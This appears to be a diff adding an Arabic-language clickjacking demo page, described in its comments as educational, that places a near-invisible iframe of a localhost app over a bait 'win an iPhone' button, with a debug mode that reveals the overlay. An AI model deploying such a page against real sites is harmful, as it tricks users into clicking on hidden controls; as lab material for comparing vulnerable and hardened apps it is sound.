@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<title>🎮 العب واكسب!</title>
+<style>
+  body { font-family: sans-serif; position: relative; }
+  .bait { position: absolute; top: 90px; left: 40px; padding: 20px 40px; font-size: 22px; }
+  /* الـ iframe شفاف وفوق الزرار الطُعم */
+  iframe { position: absolute; top: 0; left: 0; width: 700px; height: 300px; border: 0;
+           opacity: 0.0001; z-index: 2; }
+  body.debug iframe { opacity: 0.5; } /* ?debug=1 علشان تشوف الخدعة */
+</style>
+</head>
+<body>
+  <h1>🎮 اضغط وكسب آيفون!</h1>
+  <button class="bait">🎁 اضغط هنا</button>
+  <iframe id="victim"></iframe>
+  <script>
+    // صفحة تعليمية: بتحمّل أي بورت من localhost علشان نقارن بين النسخة الضعيفة والمتأمنة
+    const p = new URLSearchParams(location.search);
+    document.getElementById('victim').src = 'http://localhost:' + (p.get('port') || '3007');
+    if (p.get('debug')) document.body.classList.add('debug');
+  </script>
+</body>
+</html>
